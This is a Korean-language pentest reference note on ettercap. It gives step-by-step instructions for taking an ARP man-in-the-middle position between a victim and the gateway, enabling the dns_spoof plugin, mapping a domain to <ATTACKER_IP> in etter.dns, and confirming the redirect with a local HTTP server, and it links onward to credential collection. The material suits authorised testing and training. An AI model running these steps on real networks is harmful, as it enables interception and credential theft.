---
tags:
  - 기능/중계
실행환경: ["Linux"]
필요권한: ["로컬 root 권한"]
필요조건: ["피해자와 게이트웨이가 보이는 동일 L2 네트워크", "대상과 게이트웨이 주소"]
결과: ["트래픽 리디렉션", "자격증명 단서", "네트워크 영향 검증"]
---

# ettercap

## 도구 개요

`ettercap`은 Layer 2 네트워크에서 ARP 중간자 위치를 구성하고 트래픽을 관찰·조작하는 도구다. 특히 GUI에서 피해자와 게이트웨이를 지정하고 `dns_spoof` 플러그인으로 DNS 응답 변경 영향을 검증할 때 적합하다.

## 필요한 입력과 실행 환경

- 실행 위치: 피해자와 게이트웨이가 보이는 동일 L2 네트워크의 Linux 호스트
- 필요한 권한과 입력: 로컬 root, 대상 주소, 게이트웨이 주소, 사용할 인터페이스
- DNS 조작 입력: `/etc/ettercap/etter.dns`의 정확한 도메인/IP 매핑; HTTPS는 인증서와 HSTS의 영향을 받는다.


## 표준 사용법

```bash
sudo ettercap -G
```

GUI에서 호스트를 스캔하고 피해자와 게이트웨이를 Target으로 지정한 뒤 `dns_spoof` 플러그인을 활성화한다.

## 대표 예시

### DNS spoof 규칙 확인

```bash
cat /etc/ettercap/etter.dns
```

예시:

```text
<DOMAIN>      A   <ATTACKER_IP>
*.<DOMAIN>    A   <ATTACKER_IP>
```

확인할 출력:

- 조작할 도메인과 공격자 IP가 정확히 들어 있는지 확인한다.

### GUI 실행

```bash
sudo ettercap -G
```

확인할 흐름:

- `Hosts > Scan for Hosts`
- 피해자 IP를 Target1, 게이트웨이를 Target2로 지정
- `Plugins > Manage Plugins > dns_spoof` 활성화

### 리디렉션 수신 확인

```bash
python3 -m http.server 80
```

확인할 출력:

- 피해자가 조작된 도메인에 접속하면 HTTP 요청 로그가 남는다.

## 주요 옵션과 요소

| 항목 | 의미 | 자주 쓰는 상황 |
|---|---|---|
| `-G` | GUI 실행 | 플러그인과 타깃을 눈으로 확인할 때 |
| `/etc/ettercap/etter.dns` | DNS spoof 규칙 파일 | 도메인과 공격자 IP 매핑 |
| `dns_spoof` | DNS 응답 조작 플러그인 | Local DNS Cache Poisoning |
| Target1/Target2 | 피해자와 게이트웨이 지정 | MITM 위치 구성 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| 피해자 DNS 결과가 공격자 IP로 변경 | DNS spoofing 성공 | HTTP 로그, 브라우저 표시로 영향 확인 |
| HTTP 서버 로그 발생 | 피해자 트래픽 유도 성공 | 요청된 도메인과 경로 확인 |
| HTTPS 인증서 경고 | 도메인만 조작되고 인증서는 불일치 | HTTP와 HTTPS 영향 분리 |
| DNS 결과 변화 없음 | MITM 위치 실패, DoH, 캐시, resolver 차이 | 네트워크 위치, 캐시, DNS 경로 확인 |

## 관련 공격기법

- [[Ettercap L2 MITM DNS Spoofing]]
- [[네트워크 트래픽 자격증명 수집]]
